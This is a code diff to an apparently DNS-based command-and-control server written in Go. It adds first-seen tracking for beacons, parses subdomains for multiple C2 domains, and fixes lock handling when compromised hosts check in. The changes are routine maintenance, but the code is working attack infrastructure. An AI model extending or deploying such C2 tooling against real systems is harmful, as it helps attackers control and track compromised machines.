@@ -26,6 +26,7 @@ type Beacon struct {
 	Username    string    `json:"username"`
 	OS          string    `json:"os"`
 	Arch        string    `json:"arch"`
+	FirstSeen   time.Time `json:"first_seen"`
 	LastSeen    time.Time `json:"last_seen"`
 	IPAddress   string    `json:"ip_address"`
 	TaskQueue   []Task    `json:"-"` // Don't serialize tasks
@@ -611,18 +612,18 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 	// NOTE: No mutex lock here - individual handler functions manage their own locks
 	// to prevent deadlock when handlers call other functions that also need locks
 
-	// Quick filter: only process queries to our configured domain
-	if !strings.HasSuffix(qname, c2.domain) {
+	// In distributed mode, we need to handle queries for any C2 domain, not just our own
+	// Extract subdomain by finding the last two labels (assumed to be the domain)
+	// Example: "base36data.timestamp.secwolf.net" -> subdomain = "base36data.timestamp"
+	
+	parts := strings.Split(qname, ".")
+	if len(parts) < 3 {
+		// Need at least subdomain.domain.tld
 		return "", false
 	}
 
-	// Extract subdomain before our domain
-	domainPos := strings.Index(qname, c2.domain)
-	if domainPos == -1 {
-		return "", false
-	}
-
-	subdomain := strings.TrimRight(qname[:domainPos], ".")
+	// Assume last 2 parts are domain.tld (e.g., "secwolf.net" or "errantshield.com")
+	subdomain := strings.Join(parts[:len(parts)-2], ".")
 	if len(subdomain) == 0 {
 		return "", false
 	}
@@ -838,8 +839,16 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate 
 	c2.mutex.Lock()
 	beacon, exists := c2.beacons[beaconID]
 	if !exists {
+		now := time.Now()
 		beacon = &Beacon{
 			ID:        beaconID,
+			Hostname:  hostname,
+			Username:  username,
+			OS:        os,
+			Arch:      arch,
+			FirstSeen: now,
+			LastSeen:  now,
+			IPAddress: clientIP,
 			TaskQueue: []Task{},
 		}
 		c2.beacons[beaconID] = beacon
@@ -859,18 +868,15 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate 
 			}()
 		}
 	} else {
+		// Update beacon info for existing beacon
+		beacon.Hostname = hostname
+		beacon.Username = username
+		beacon.OS = os
+		beacon.Arch = arch
+		beacon.LastSeen = time.Now()
+		beacon.IPAddress = clientIP
 		c2.mutex.Unlock()
 	}
-
-	// Update beacon info (re-acquire lock for modification)
-	c2.mutex.Lock()
-	beacon.Hostname = hostname
-	beacon.Username = username
-	beacon.OS = os
-	beacon.Arch = arch
-	beacon.LastSeen = time.Now()
-	beacon.IPAddress = clientIP
-	c2.mutex.Unlock()
 
 	// Update beacon in master if it already existed (periodic check-in)
 	if exists && masterClient != nil {
@@ -890,6 +896,7 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate 
 		Username:  beacon.Username,
 		OS:        beacon.OS,
 		Arch:      beacon.Arch,
+		FirstSeen: beacon.FirstSeen,
 		LastSeen:  beacon.LastSeen,
 		IPAddress: beacon.IPAddress,
 	}
